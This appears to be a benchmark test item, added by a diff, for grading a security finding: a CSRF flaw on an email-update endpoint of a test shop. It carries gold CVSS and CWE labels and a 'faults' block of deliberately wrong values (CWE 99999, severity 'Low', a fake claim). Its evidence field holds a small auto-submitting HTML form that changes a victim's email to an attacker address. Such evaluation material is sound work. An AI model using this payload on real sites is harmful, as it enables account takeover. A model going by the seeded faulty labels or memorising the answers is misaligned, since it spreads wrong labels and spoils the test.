@@ -1,0 +1,30 @@
+{
+  "id": "csrf-account-email",
+  "split": "dev",
+  "title": "Cross-Site Request Forgery on email update endpoint",
+  "asset": "https://shop.acme.test/api/user/email",
+  "notes": "POST /api/user/email lacks CSRF protection or anti-CSRF token. An attacker can host a malicious webpage that forces authenticated victims to update their account email address.",
+  "evidence": [
+    {
+      "name": "csrf-poc.html",
+      "text": "<form action='https://shop.acme.test/api/user/email' method='POST'>\n  <input type='hidden' name='email' value='attacker@evil.test' />\n</form>\n<script>document.forms[0].submit();</script>"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+    "cwe": [
+      "352"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 6.5,
+    "severity": "Medium"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
